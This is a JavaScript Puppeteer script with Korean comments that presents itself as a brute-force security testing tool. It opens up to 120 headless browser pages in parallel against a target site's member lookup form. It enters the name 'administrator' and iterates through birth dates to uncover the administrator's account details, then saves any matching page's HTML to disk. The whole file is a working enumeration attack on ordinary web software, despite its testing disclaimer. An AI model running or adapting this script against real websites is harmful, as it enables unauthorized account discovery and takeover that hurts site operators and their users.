/**
 * TODO: 본 프로젝트는 Brute Force Attack 방식을 테스트 하기 위한 테스트용 공격 툴입니다.
 * ? 타겟 웹사이트의 입력 필드에 모든 경우의 수를 입력하여 관리자의 계정을 탐색하도록 설계 되어 있습니다.
 * ? Puppeteer를 이용하여 웹 브라우저를 한 번에 120개까지 오픈하여 랜덤한 순서로 값을 입력합니다.
 * ! 실제 공격용으로 사용하기에는 성능상 문제가 있으며, 단순 Brute Force 보안 테스트 용도로 사용 되는 툴임을 숙지하세요!
 * ! 사용 시 발생하는 모든 문제는 사용자에게 책임이 있음을 알려드립니다.
 */
require('dotenv').config();

const puppeteer = require('puppeteer');
const moment = require('moment');
const fs = require('fs');
const {
  TARGET_URI,
  START_YEAR,
  START_MONTH,
  START_DATE,
  END_YEAR,
  END_MONTH,
  END_DATE,
} = process.env;

const target = TARGET_URI;

(async () => {
  const step = 120;
  const startDate = moment()
    .set({
      year: START_YEAR,
      month: START_MONTH,
      date: START_DATE,
    })
    .startOf(); // month는 실제 의도한 월에서 -1을 한 숫자로 입력해야 합니다.
  const endDate = moment()
    .set({
      year: END_YEAR,
      month: END_MONTH,
      date: END_DATE,
    })
    .endOf(); // month는 실제 의도한 월에서 -1을 한 숫자로 입력해야 합니다.
  const diffDays = endDate.diff(startDate, 'day');
  const browser = await puppeteer.launch({ headless: true });
  let flag = false;
  const setDate = async (date) => {
    const currentDateString = moment(date).format('YYYY-MM-DD');
    console.log('Start! ', currentDateString);
    const page = await browser.newPage();
    await page.goto(target, { timeout: 0 });
    const year = moment(date)
      .year()
      .toString();
    const month = (moment(date).month() + 1).toString().padStart(2, '0');
    const day = moment(date)
      .date()
      .toString()
      .padStart(2, '0');

    await page.click('input[name="mberNm"]', { clickCount: 3 });
    await page.type('input[name="mberNm"]', '관리자');
    await page.select('select[name="birthYear"]', year);
    await page.select('select[name="birthMonth"]', month);
    await page.waitForNetworkIdle();
    await page.select('select[name="birthDate"]', day);
    await page.click('.join_btn_center a');
    await page.waitForNetworkIdle();
    const isFound = await page.evaluate(() => {
      return !(document
        .querySelector('html')
        .outerHTML.includes('조회된 데이터가 없습니다.'));
    });
    if (isFound) {
      const html = await page.evaluate(() => document.querySelector('html').outerHTML);
      fs.writeFileSync(`./codes/${currentDateString}.txt`, html);
    }
    await page.close();
    console.log('Done! ', currentDateString, ', status: ', isFound ? 'success' : 'failed');
    flag = isFound;
  };

  const partsLength = Math.ceil(diffDays / step);
  for await (const index of Array(partsLength).keys()) {
    const promises = [];
    for (let i = index * step; i < (index * step) + step; i += 1) {
      const current = moment(startDate).add(i, 'days');
      promises.push(setDate(current));
    }
    await Promise.all(promises);
    if (flag) break;
  }
})();